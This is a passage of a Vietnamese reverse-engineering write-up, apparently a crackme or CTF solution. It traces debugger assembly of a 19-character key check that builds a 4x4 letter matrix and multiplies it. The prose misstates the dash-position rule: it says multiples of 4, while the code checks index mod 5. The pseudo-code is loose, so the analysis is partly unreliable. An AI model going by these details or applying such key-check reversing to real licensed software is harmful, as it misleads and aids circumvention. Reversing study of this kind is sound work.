+</code></pre><p>Đọc đoạn asm này kết hợp với debug, chúng ta dễ dàng nhận ra chương trình loại bỏ ký tự &ldquo;/n&rdquo; cuối cùng từ input, sau đó lưu lại giá trị này lên stack. Cuối đoạn mã này, chương trình đẩy địa chỉ của vùng nhớ chứa chuỗi input vào rdi.</p>
+<pre tabindex="0"><code>=&gt; 0x55555555769c:	endbr64                            // kiem tra do dai input
+=&gt; 0x5555555576b5:	push   rbp
+=&gt; 0x5555555576d1:	mov    rbp,rsp
+=&gt; 0x5555555576f2:	sub    rsp,0x18
+=&gt; 0x55555555770e:	mov    QWORD PTR [rbp-0x18],rdi
+=&gt; 0x555555557734:	mov    QWORD PTR [rbp-0x8],0x0
+=&gt; 0x555555557765:	jmp    0x5555555577d0
+=&gt; 0x5555555577dc:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x5555555577fe:	movzx  eax,BYTE PTR [rax]
+=&gt; 0x55555555781e:	test   al,al
+=&gt; 0x555555557840:	jne    0x55555555777a
+
+=&gt; 0x55555555778d:	add    QWORD PTR [rbp-0x8],0x1
+=&gt; 0x5555555577b8:	add    QWORD PTR [rbp-0x18],0x1
+=&gt; 0x5555555577dc:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x5555555577fe:	movzx  eax,BYTE PTR [rax]
+=&gt; 0x55555555781e:	test   al,al
+=&gt; 0x555555557840:	jne    0x55555555777a
+</code></pre><p>Chương trình bắt đầu call một hàm, bên trong hàm này chương trình duyệt qua các ký tự của string và cập nhật kết quả độ dài của string. Khi vòng lặp kết thúc, chương trình lưu giá trị biến đếm vào rax và thoát khỏi hàm, sau đó so sánh độ dài string với 0x13.</p>
+<pre tabindex="0"><code>=&gt; 0x555555557867:	mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x555555557880:	leave
+=&gt; 0x55555555788a:	ret
+
+
+=&gt; 0x55555555b357:	cmp    rax,0x13               // kiem tra do dai string.
+    → cmp operands: $rax = 19, 0x13 = 19
+</code></pre><p>Nếu như độ dài string input thỏa mãn độ dài 19, rip của chương trình nhảy tiếp vào đoạn mã sau:</p>
+<pre tabindex="0"><code>=&gt; 0x55555555b37c:	je     0x55555555b418                                       // loop kiem tra dieu kien dau tien
+=&gt; 0x55555555b437:	mov    DWORD PTR [rbp-0x294],0x0
+=&gt; 0x55555555b47c:	mov    BYTE PTR [rbp-0x296],0x1
+=&gt; 0x55555555b4be:	mov    DWORD PTR [rbp-0x290],0x0
+=&gt; 0x55555555b4fa:	jmp    0x55555555bd54
+=&gt; 0x55555555bd70:	cmp    DWORD PTR [rbp-0x290],0x12
+    → cmp operands: DWORD PTR [rbp-0x290] = N/A, 0x12 = 18
+=&gt; 0x55555555bda8:	jle    0x55555555b512
+
+=&gt; 0x55555555b527:	mov    edx,DWORD PTR [rbp-0x290]
+=&gt; 0x55555555b554:	movsxd rax,edx
+=&gt; 0x55555555b585:	imul   rax,rax,0x66666667
+=&gt; 0x55555555b5b4:	shr    rax,0x20
+=&gt; 0x55555555b5cf:	sar    eax,1
+=&gt; 0x55555555b5e7:	mov    ecx,edx
+=&gt; 0x55555555b606:	sar    ecx,0x1f
+=&gt; 0x55555555b626:	sub    eax,ecx
+=&gt; 0x55555555b63e:	mov    ecx,eax
+=&gt; 0x55555555b65d:	shl    ecx,0x2
+=&gt; 0x55555555b67d:	add    ecx,eax
+=&gt; 0x55555555b695:	mov    eax,edx
+=&gt; 0x55555555b6ad:	sub    eax,ecx
+=&gt; 0x55555555b6cc:	cmp    eax,0x4
+    → cmp operands: $eax = 0, 0x4 = 4
+=&gt; 0x55555555b6f6:	jne    0x55555555b8e4
+=&gt; 0x55555555b8f9:	mov    eax,DWORD PTR [rbp-0x294]
+=&gt; 0x55555555b926:	lea    edx,[rax+0x1]
+=&gt; 0x55555555b950:	mov    DWORD PTR [rbp-0x294],edx
+=&gt; 0x55555555b980:	mov    edx,DWORD PTR [rbp-0x290]
+=&gt; 0x55555555b9ad:	movsxd rdx,edx
+=&gt; 0x55555555b9d8:	movzx  edx,BYTE PTR [rbp+rdx*1-0x210]
+=&gt; 0x55555555ba01:	cdqe
+=&gt; 0x55555555ba2a:	mov    BYTE PTR [rbp+rax*1-0x110],dl
+=&gt; 0x55555555ba69:	movzx  edx,BYTE PTR [rbp-0x296]
+=&gt; 0x55555555baa1:	mov    eax,DWORD PTR [rbp-0x290]
+=&gt; 0x55555555bac7:	cdqe
+=&gt; 0x55555555baea:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
+=&gt; 0x55555555bb13:	cmp    al,0x40
+    → cmp operands: $al = 65, 0x40 = 64
+=&gt; 0x55555555bb35:	jle    0x55555555bc63
+=&gt; 0x55555555bb65:	mov    eax,DWORD PTR [rbp-0x290]
+=&gt; 0x55555555bb8b:	cdqe
+=&gt; 0x55555555bbae:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
+=&gt; 0x55555555bbd7:	cmp    al,0x5a
+    → cmp operands: $al = 65, 0x5a = 90
+=&gt; 0x55555555bbf9:	jg     0x55555555bc63
+=&gt; 0x55555555bc23:	mov    eax,0x1
+=&gt; 0x55555555bc4e:	jmp    0x55555555bc8e
+=&gt; 0x55555555bc99:	and    eax,edx
+=&gt; 0x55555555bcb1:	test   eax,eax
+=&gt; 0x55555555bcd0:	setne  al
+=&gt; 0x55555555bcfa:	mov    BYTE PTR [rbp-0x296],al
+=&gt; 0x55555555bd31:	add    DWORD PTR [rbp-0x290],0x1
+=&gt; 0x55555555bd70:	cmp    DWORD PTR [rbp-0x290],0x12
+    → cmp operands: DWORD PTR [rbp-0x290] = N/A, 0x12 = 18
+=&gt; 0x55555555bda8:	jle    0x55555555b512
+</code></pre><p>Đoạn mã này lặp qua các giá trị của string và kiểm tra điều kiện của mỗi ký tự. Ở các index không chia hết cho 4, chương trình sẽ kiểm tra xem giá trị có nằm trong khoảng từ 0x41 đến 0x5a hay không (các giá trị của ký tự chữ cái in hoa). Đối với trường hợp index chia hết cho 4, chương trình sẽ thực thi kiểm tra xem có phải 0x2d (tức &lsquo;-&rsquo;) hay không.</p>
+<pre tabindex="0"><code>=&gt; 0x55555555b72d:	movzx  edx,BYTE PTR [rbp-0x296]
+=&gt; 0x55555555b765:	mov    eax,DWORD PTR [rbp-0x290]
+=&gt; 0x55555555b78b:	cdqe
+=&gt; 0x55555555b7ae:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
+=&gt; 0x55555555b7d7:	cmp    al,0x2d
+    → cmp operands: $al = 45, 0x2d = 45
+</code></pre><p>Tuy nhiên, chương trình chỉ lưu lại các giá trị từ 0x41 đến 0x5a (&lsquo;A&rsquo; đến &lsquo;Z&rsquo;). Sau khi loại bỏ hết các ký tự &lsquo;-&rsquo; trong string, chương trình tiếp tục duyệt qua từng phần tử một và thực hiện 1 logic biến đổi nào đó.</p>
+<pre tabindex="0"><code>=&gt; 0x55555555bfed:	mov    eax,DWORD PTR [rbp-0x28c]      // loop 1
+=&gt; 0x55555555c024:	lea    edx,[rax*4+0x0]
+=&gt; 0x55555555c05c:	mov    eax,DWORD PTR [rbp-0x288]
+=&gt; 0x55555555c082:	add    eax,edx                               // k=4*i+j
+=&gt; 0x55555555c09a:	cdqe
+=&gt; 0x55555555c0bd:	movzx  eax,BYTE PTR [rbp+rax*1-0x110]       
+=&gt; 0x55555555c0ed:	movsx  eax,al
+=&gt; 0x55555555c114:	lea    edx,[rax-0x41]                 // edx=pos(input[k])
+=&gt; 0x55555555c13e:	mov    eax,DWORD PTR [rbp-0x28c]
+=&gt; 0x55555555c175:	imul   eax,DWORD PTR [rbp-0x288]
+=&gt; 0x55555555c1a3:	mov    ecx,eax
+=&gt; 0x55555555c1bb:	mov    eax,edx
+=&gt; 0x55555555c1d3:	sub    eax,ecx                   
+=&gt; 0x55555555c1f2:	movsxd rcx,eax                  //rcx=pos(input[k])-i*j
+=&gt; 0x55555555c21c:	mov    eax,DWORD PTR [rbp-0x288]
+=&gt; 0x55555555c249:	movsxd rdx,eax
+=&gt; 0x55555555c273:	mov    eax,DWORD PTR [rbp-0x28c]
+=&gt; 0x55555555c2a0:	movsxd rsi,eax
+=&gt; 0x55555555c2d1:	lea    rax,[rbp-0x250]             
+=&gt; 0x55555555c306:	mov    rdi,rax                                    
+=&gt; 0x55555555c32e:	call   0x555555556180
+
+
+
+=&gt; 0x55555555618c:	endbr64
+=&gt; 0x5555555561a5:	push   rbp
+=&gt; 0x5555555561c1:	mov    rbp,rsp
+=&gt; 0x5555555561e2:	sub    rsp,0x30
+=&gt; 0x5555555561fe:	mov    QWORD PTR [rbp-0x18],rdi     // 4
+=&gt; 0x55555555621a:	mov    QWORD PTR [rbp-0x20],rsi    //  i
+=&gt; 0x555555556236:	mov    QWORD PTR [rbp-0x28],rdx    // j
+=&gt; 0x555555556252:	mov    QWORD PTR [rbp-0x30],rcx    // pos(input[k])-i*j
+=&gt; 0x55555555626e:	mov    rax,QWORD PTR [rbp-0x18]    
+=&gt; 0x555555556290:	mov    rax,QWORD PTR [rax]          
+=&gt; 0x5555555562b1:	cmp    QWORD PTR [rbp-0x20],rax    // cmp i,4
+    → cmp operands: [rbp-0x20] = N/A, $rax = 4
+=&gt; 0x5555555562d6:	jb     0x555555556343
+=&gt; 0x55555555634f:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555636b:	mov    rax,QWORD PTR [rax+0x8]    
+=&gt; 0x555555556387:	cmp    QWORD PTR [rbp-0x28],rax          // cmp j,4
+    → cmp operands: [rbp-0x28] = N/A, $rax = 4           
+=&gt; 0x5555555563ac:	jb     0x555555556419
+
+=&gt; 0x555555556425:	mov    rax,QWORD PTR [rbp-0x18]    //
+=&gt; 0x555555556441:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555556464:	imul   rax,QWORD PTR [rbp-0x20]    
+=&gt; 0x55555555648e:	mov    rdx,rax
+=&gt; 0x5555555564af:	mov    rax,QWORD PTR [rbp-0x28]
+=&gt; 0x5555555564d1:	add    rax,rdx                  
+=&gt; 0x5555555564f2:	mov    QWORD PTR [rbp-0x8],rax       // QWORD PTR [rbp-0x8]=k
+=&gt; 0x55555555650e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555652a:	mov    rdx,QWORD PTR [rax+0x10]    // rdx=0x555555574a40   # memory 1
+=&gt; 0x555555556546:	mov    rax,QWORD PTR [rbp-0x8]   
+=&gt; 0x555555556562:	shl    rax,0x3                        // shl 4*i+j,0x3
+=&gt; 0x555555556584:	add    rdx,rax
+=&gt; 0x5555555565a5:	mov    rax,QWORD PTR [rbp-0x30]
+=&gt; 0x5555555565c7:	mov    QWORD PTR [rdx],rax                    // 0x555555574a40+(shl k,0x3) : pos(input[k])-i*j
+=&gt; 0x5555555565ef:	mov    eax,0x1
+=&gt; 0x555555556610:	leave
+=&gt; 0x55555555661a:	ret
+=&gt; 0x55555555c362:	add    DWORD PTR [rbp-0x288],0x1                      cap nhat index moi hang
+=&gt; 0x55555555c3a1:	cmp    DWORD PTR [rbp-0x288],0x3
+    → cmp operands: DWORD PTR [rbp-0x288] = N/A, 0x3 = 3
+=&gt; 0x55555555c3d9:	jle    0x55555555bfd8
+</code></pre><p>Đoạn mã này tải các đoạn 4 ký tự một và lưu vào 1 địa chỉ, mình dựng lại như sau.</p>
+<pre tabindex="0"><code>k=4*i+j
+for(i=0;i&lt;4;i++){
+    for(j=0;j&lt;4;j++){
+    (QWORD *) (0x555555574a40+k&lt;&lt;0x3)=input[k]-0x41-i*j
+    }
+}
+</code></pre><p>Như vậy chương trình tạo một ma trận 4x4 gồm các giá trị là khoảng cách từ vị trí của ký tự đến &lsquo;A&rsquo; rồi trừ đi i*j. Tiếp tục debug chương trình ta gặp đoạn mã sau.</p>
+<pre tabindex="0"><code>=&gt; 0x55555555c5ff:	call   0x555555556630    /// phep nhan ma tran
+
+=&gt; 0x55555555663c:	endbr64
+=&gt; 0x555555556655:	push   rbp
+=&gt; 0x555555556671:	mov    rbp,rsp
+=&gt; 0x555555556692:	sub    rsp,0x50
+=&gt; 0x5555555566ae:	mov    QWORD PTR [rbp-0x38],rdi
+=&gt; 0x5555555566ca:	mov    QWORD PTR [rbp-0x40],rsi
+=&gt; 0x5555555566e6:	mov    QWORD PTR [rbp-0x48],rdx
+=&gt; 0x555555556713:	mov    rax,QWORD PTR fs:0x28
+=&gt; 0x555555556745:	mov    QWORD PTR [rbp-0x8],rax
+=&gt; 0x555555556779:	mov    rax,QWORD PTR [rbp-0x38]
+=&gt; 0x555555556795:	mov    rdx,QWORD PTR [rax+0x8]
+=&gt; 0x5555555567b1:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x5555555567d3:	mov    rax,QWORD PTR [rax]
+=&gt; 0x5555555567fa:	cmp    rdx,rax
+    → cmp operands: $rdx = 4, $rax = 4
+=&gt; 0x555555556824:	je     0x555555556891
+=&gt; 0x55555555689d:	mov    rax,QWORD PTR [rbp-0x48]
+=&gt; 0x5555555568bf:	mov    rdx,QWORD PTR [rax]
+=&gt; 0x5555555568e0:	mov    rax,QWORD PTR [rbp-0x38]
+=&gt; 0x555555556902:	mov    rax,QWORD PTR [rax]
+=&gt; 0x555555556929:	cmp    rdx,rax
+    → cmp operands: $rdx = 4, $rax = 4
+=&gt; 0x555555556953:	jne    0x555555556a31
+=&gt; 0x55555555697a:	mov    rax,QWORD PTR [rbp-0x48]
+=&gt; 0x555555556996:	mov    rdx,QWORD PTR [rax+0x8]
+=&gt; 0x5555555569b2:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x5555555569ce:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x5555555569f0:	cmp    rdx,rax
+    → cmp operands: $rdx = 4, $rax = 4
+=&gt; 0x555555556a1a:	je     0x555555556a87
+=&gt; 0x555555556aa3:	mov    DWORD PTR [rbp-0x2c],0x0
+=&gt; 0x555555556ad9:	jmp    0x55555555749f
+=&gt; 0x5555555574b1:	mov    eax,DWORD PTR [rbp-0x2c]
+=&gt; 0x5555555574d8:	movsxd rdx,eax
+=&gt; 0x5555555574f9:	mov    rax,QWORD PTR [rbp-0x38]
+=&gt; 0x55555555751b:	mov    rax,QWORD PTR [rax]
+=&gt; 0x555555557542:	cmp    rdx,rax
+    → cmp operands: $rdx = 0, $rax = 4
+=&gt; 0x55555555756c:	jb     0x555555556af1
+=&gt; 0x555555556b0d:	mov    DWORD PTR [rbp-0x28],0x0
+=&gt; 0x555555556b43:	jmp    0x5555555573a6
+=&gt; 0x5555555573b8:	mov    eax,DWORD PTR [rbp-0x28]
+=&gt; 0x5555555573df:	movsxd rdx,eax
+=&gt; 0x555555557400:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x55555555741c:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x55555555743e:	cmp    rdx,rax
+    → cmp operands: $rdx = 0, $rax = 4
+=&gt; 0x555555557468:	jb     0x555555556b5b
+=&gt; 0x555555556b71:	mov    QWORD PTR [rbp-0x10],0x0
+=&gt; 0x555555556bab:	mov    DWORD PTR [rbp-0x24],0x0
+=&gt; 0x555555556be1:	jmp    0x5555555570bb
+=&gt; 0x5555555570cd:	mov    eax,DWORD PTR [rbp-0x24]
+=&gt; 0x5555555570f4:	movsxd rdx,eax
+=&gt; 0x555555557115:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x555555557137:	mov    rax,QWORD PTR [rax]
+=&gt; 0x55555555715e:	cmp    rdx,rax
+    → cmp operands: $rdx = 0, $rax = 4
+=&gt; 0x555555557188:	jb     0x555555556bf9
+=&gt; 0x555555556c0f:	mov    QWORD PTR [rbp-0x20],0x0
+=&gt; 0x555555556c43:	mov    QWORD PTR [rbp-0x18],0x0
+=&gt; 0x555555556c73:	mov    eax,DWORD PTR [rbp-0x24]
+=&gt; 0x555555556c9a:	movsxd rdx,eax
+=&gt; 0x555555556cc1:	mov    eax,DWORD PTR [rbp-0x2c]
+=&gt; 0x555555556ce8:	movsxd rsi,eax
+=&gt; 0x555555556d09:	lea    rcx,[rbp-0x20]
+=&gt; 0x555555556d25:	mov    rax,QWORD PTR [rbp-0x38]
+=&gt; 0x555555556d47:	mov    rdi,rax
+
+=&gt; 0x555555556d6f:	call   0x555555555ca0
+
+=&gt; 0x555555555cac:	endbr64
+=&gt; 0x555555555cc5:	push   rbp
+=&gt; 0x555555555ce1:	mov    rbp,rsp
+=&gt; 0x555555555d02:	sub    rsp,0x30
+=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
+=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
+=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
+=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
+=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
+=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
+    → cmp operands: [rbp-0x20] = N/A, $rax = 4
+=&gt; 0x555555555df6:	jb     0x555555555e63
+=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
+    → cmp operands: [rbp-0x28] = N/A, $rax = 4
+=&gt; 0x555555555ecc:	jb     0x555555555f39
+=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
+=&gt; 0x555555555fae:	mov    rdx,rax
+=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
+=&gt; 0x555555555ff1:	add    rax,rdx
+=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
+=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
+=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x555555556082:	shl    rax,0x3
+=&gt; 0x5555555560a4:	add    rax,rdx
+=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
+=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
+=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
+=&gt; 0x555555556136:	mov    eax,0x1
+=&gt; 0x555555556157:	leave
+=&gt; 0x555555556161:	ret
+
+=&gt; 0x555555556db9:	test   al,al
+=&gt; 0x555555556ddb:	je     0x555555556e48
+=&gt; 0x555555556e5a:	mov    eax,DWORD PTR [rbp-0x28]
+=&gt; 0x555555556e81:	movsxd rdx,eax
+=&gt; 0x555555556ea8:	mov    eax,DWORD PTR [rbp-0x24]
+=&gt; 0x555555556ecf:	movsxd rsi,eax
+=&gt; 0x555555556ef0:	lea    rcx,[rbp-0x18]
+=&gt; 0x555555556f0c:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x555555556f2e:	mov    rdi,rax
+=&gt; 0x555555556f56:	call   0x555555555ca0
+=&gt; 0x555555555cac:	endbr64
+=&gt; 0x555555555cc5:	push   rbp
+=&gt; 0x555555555ce1:	mov    rbp,rsp
+=&gt; 0x555555555d02:	sub    rsp,0x30
+=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
+=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
+=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
+=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
+=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
+=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
+    → cmp operands: [rbp-0x20] = N/A, $rax = 4
+=&gt; 0x555555555df6:	jb     0x555555555e63
+=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
+    → cmp operands: [rbp-0x28] = N/A, $rax = 4
+=&gt; 0x555555555ecc:	jb     0x555555555f39
+=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
+=&gt; 0x555555555fae:	mov    rdx,rax
+=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
+=&gt; 0x555555555ff1:	add    rax,rdx
+=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
+=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
+=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x555555556082:	shl    rax,0x3
+=&gt; 0x5555555560a4:	add    rax,rdx
+=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
+=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
+=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
+=&gt; 0x555555556136:	mov    eax,0x1
+=&gt; 0x555555556157:	leave
+=&gt; 0x555555556161:	ret
+
+
+=&gt; 0x555555555cac:	endbr64
+=&gt; 0x555555555cc5:	push   rbp
+=&gt; 0x555555555ce1:	mov    rbp,rsp
+=&gt; 0x555555555d02:	sub    rsp,0x30
+=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi
+=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi
+=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx
+=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx
+=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]
+=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax
+    → cmp operands: [rbp-0x20] = N/A, $rax = 4
+=&gt; 0x555555555df6:	jb     0x555555555e63
+=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax
+    → cmp operands: [rbp-0x28] = N/A, $rax = 4
+=&gt; 0x555555555ecc:	jb     0x555555555f39
+=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20]
+=&gt; 0x555555555fae:	mov    rdx,rax
+=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
+=&gt; 0x555555555ff1:	add    rax,rdx
+=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax
+=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]
+=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x555555556082:	shl    rax,0x3
+=&gt; 0x5555555560a4:	add    rax,rdx
+=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]
+=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30]
+=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx
+=&gt; 0x555555556136:	mov    eax,0x1
+=&gt; 0x555555556157:	leave
+=&gt; 0x555555556161:	ret
+
+=&gt; 0x555555556db9:	test   al,al
+=&gt; 0x555555556ddb:	je     0x555555556e48
+=&gt; 0x555555556e5a:	mov    eax,DWORD PTR [rbp-0x28]
+=&gt; 0x555555556e81:	movsxd rdx,eax
+=&gt; 0x555555556ea8:	mov    eax,DWORD PTR [rbp-0x24]
+=&gt; 0x555555556ecf:	movsxd rsi,eax
+=&gt; 0x555555556ef0:	lea    rcx,[rbp-0x18]
+=&gt; 0x555555556f0c:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x555555556f2e:	mov    rdi,rax
+=&gt; 0x555555556f56:	call   0x555555555ca0
+...........
+
+=&gt; 0x555555556fa0:	test   al,al
+=&gt; 0x555555556fc2:	je     0x55555555702f
+=&gt; 0x55555555703b:	mov    rdx,QWORD PTR [rbp-0x20]
+=&gt; 0x555555557057:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555557073:	imul   rax,rdx
+=&gt; 0x55555555708f:	add    QWORD PTR [rbp-0x10],rax
+=&gt; 0x5555555570ab:	add    DWORD PTR [rbp-0x24],0x1
+=&gt; 0x5555555570cd:	mov    eax,DWORD PTR [rbp-0x24]
+=&gt; 0x5555555570f4:	movsxd rdx,eax
+=&gt; 0x555555557115:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x555555557137:	mov    rax,QWORD PTR [rax]
+=&gt; 0x55555555715e:	cmp    rdx,rax
+    → cmp operands: $rdx = 4, $rax = 4
+=&gt; 0x555555557188:	jb     0x555555556bf9
+=&gt; 0x5555555571b5:	mov    eax,DWORD PTR [rbp-0x28]
+=&gt; 0x5555555571dc:	movsxd rdx,eax
+=&gt; 0x555555557203:	mov    eax,DWORD PTR [rbp-0x2c]
+=&gt; 0x55555555722a:	movsxd rsi,eax
+=&gt; 0x55555555724b:	mov    rcx,QWORD PTR [rbp-0x10]
+=&gt; 0x555555557267:	mov    rax,QWORD PTR [rbp-0x48]
+=&gt; 0x555555557289:	mov    rdi,rax
+=&gt; 0x5555555572b1:	call   0x555555556180
+=&gt; 0x55555555618c:	endbr64
+=&gt; 0x5555555561a5:	push   rbp
+=&gt; 0x5555555561c1:	mov    rbp,rsp
+=&gt; 0x5555555561e2:	sub    rsp,0x30
+=&gt; 0x5555555561fe:	mov    QWORD PTR [rbp-0x18],rdi
+=&gt; 0x55555555621a:	mov    QWORD PTR [rbp-0x20],rsi
+=&gt; 0x555555556236:	mov    QWORD PTR [rbp-0x28],rdx
+=&gt; 0x555555556252:	mov    QWORD PTR [rbp-0x30],rcx
+=&gt; 0x55555555626e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555556290:	mov    rax,QWORD PTR [rax]
+=&gt; 0x5555555562b1:	cmp    QWORD PTR [rbp-0x20],rax
+    → cmp operands: [rbp-0x20] = N/A, $rax = 4
+=&gt; 0x5555555562d6:	jb     0x555555556343
+=&gt; 0x55555555634f:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555636b:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555556387:	cmp    QWORD PTR [rbp-0x28],rax
+    → cmp operands: [rbp-0x28] = N/A, $rax = 4
+=&gt; 0x5555555563ac:	jb     0x555555556419
+=&gt; 0x555555556425:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555556441:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x555555556464:	imul   rax,QWORD PTR [rbp-0x20]
+=&gt; 0x55555555648e:	mov    rdx,rax
+=&gt; 0x5555555564af:	mov    rax,QWORD PTR [rbp-0x28]
+=&gt; 0x5555555564d1:	add    rax,rdx
+=&gt; 0x5555555564f2:	mov    QWORD PTR [rbp-0x8],rax
+=&gt; 0x55555555650e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555652a:	mov    rdx,QWORD PTR [rax+0x10]
+=&gt; 0x555555556546:	mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x555555556562:	shl    rax,0x3
+=&gt; 0x555555556584:	add    rdx,rax
+=&gt; 0x5555555565a5:	mov    rax,QWORD PTR [rbp-0x30]
+=&gt; 0x5555555565c7:	mov    QWORD PTR [rdx],rax
+=&gt; 0x5555555565ef:	mov    eax,0x1
+=&gt; 0x555555556610:	leave
+=&gt; 0x55555555661a:	ret
+=&gt; 0x5555555572fb:	test   al,al
+=&gt; 0x55555555731d:	je     0x55555555738a
+=&gt; 0x555555557396:	add    DWORD PTR [rbp-0x28],0x1
+=&gt; 0x5555555573b8:	mov    eax,DWORD PTR [rbp-0x28]
+=&gt; 0x5555555573df:	movsxd rdx,eax
+=&gt; 0x555555557400:	mov    rax,QWORD PTR [rbp-0x40]
+=&gt; 0x55555555741c:	mov    rax,QWORD PTR [rax+0x8]
+=&gt; 0x55555555743e:	cmp    rdx,rax
+    → cmp operands: $rdx = 4, $rax = 4
+=&gt; 0x555555557468:	jb     0x555555556b5b
+=&gt; 0x55555555748f:	add    DWORD PTR [rbp-0x2c],0x1
+=&gt; 0x5555555574b1:	mov    eax,DWORD PTR [rbp-0x2c]
+=&gt; 0x5555555574d8:	movsxd rdx,eax
+=&gt; 0x5555555574f9:	mov    rax,QWORD PTR [rbp-0x38]
+=&gt; 0x55555555751b:	mov    rax,QWORD PTR [rax]
+=&gt; 0x555555557542:	cmp    rdx,rax
+    → cmp operands: $rdx = 4, $rax = 4
+=&gt; 0x55555555756c:	jb     0x555555556af1
+=&gt; 0x55555555759a:	mov    eax,0x1
+=&gt; 0x5555555575be:	mov    rdx,QWORD PTR [rbp-0x8]
+.......
